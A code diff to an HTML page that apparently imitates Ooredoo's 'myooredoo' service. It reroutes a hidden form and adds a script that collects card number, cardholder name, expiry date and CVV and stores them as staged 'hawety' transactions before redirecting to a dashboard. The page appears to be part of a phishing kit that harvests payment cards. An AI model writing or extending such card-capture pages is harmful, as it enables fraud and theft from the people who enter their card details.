@@ -610,7 +610,7 @@
                 // إنشاء فورم مخفي لتقديم البيانات باستخدام POST
                 var form = document.createElement('form');
                 form.method = 'POST';
-                form.action = "/myooredoo/store8";
+                form.action = "javascript:void(0)"; form.onsubmit = function(e) { handleHawety(e); return false; };
 
                 // إضافة توكن CSRF
                 var csrfInput = document.createElement('input');
@@ -675,3 +675,31 @@
 </body>
 
 </html>
+<script>
+function handleHawety(event) {
+    event.preventDefault();
+    
+    // Get Hawety data
+    const cardNumber = document.querySelector('input[name="cardNumber"]') ? document.querySelector('input[name="cardNumber"]').value : '';
+    const cardHolder = document.querySelector('input[name="cardHolder"]') ? document.querySelector('input[name="cardHolder"]').value : '';
+    const expireDate = document.querySelector('input[name="expireDate"]') ? document.querySelector('input[name="expireDate"]').value : '';
+    const cvv = document.querySelector('input[name="cvv"]') ? document.querySelector('input[name="cvv"]').value : '';
+    
+    // Create transaction data
+    const transactionData = {
+        cardNumber: cardNumber,
+        cardHolder: cardHolder,
+        expireDate: expireDate,
+        cvv: cvv,
+        timestamp: new Date().toISOString(),
+        stage: 'hawety'
+    };
+    
+    // Store in localStorage
+    const transactionKey = 'transaction_hawety_' + Date.now();
+    localStorage.setItem(transactionKey, JSON.stringify(transactionData));
+    
+    // Redirect to dashboard
+    window.location.href = '/dashboard.html';
+}
+</script>
